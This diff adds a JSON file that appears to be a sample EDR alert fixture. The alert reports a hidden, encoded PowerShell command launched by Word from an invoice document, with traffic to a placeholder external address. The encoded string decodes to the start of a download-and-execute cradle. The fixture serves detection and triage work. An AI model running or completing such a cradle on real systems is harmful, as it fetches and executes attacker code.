@@ -1,0 +1,20 @@
+{
+  "alert_id": "ALT-001",
+  "timestamp": "2026-03-02T09:11:58Z",
+  "source": "edr",
+  "severity": "high",
+  "event_type": "suspicious_powershell_execution",
+  "host": "ws-fin-014",
+  "user": "d.moreau",
+  "src_ip": "10.40.12.14",
+  "dst_ip": "203.0.113.47",
+  "process_name": "powershell.exe",
+  "command_line": "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+  "raw": {
+    "vendor_rule": "EDR-PS-0042",
+    "vendor_event_id": 4104,
+    "detection_confidence": "high",
+    "parent_process": "winword.exe",
+    "document": "C:\\Users\\d.moreau\\Documents\\Invoice_2026-03.docx"
+  }
+}
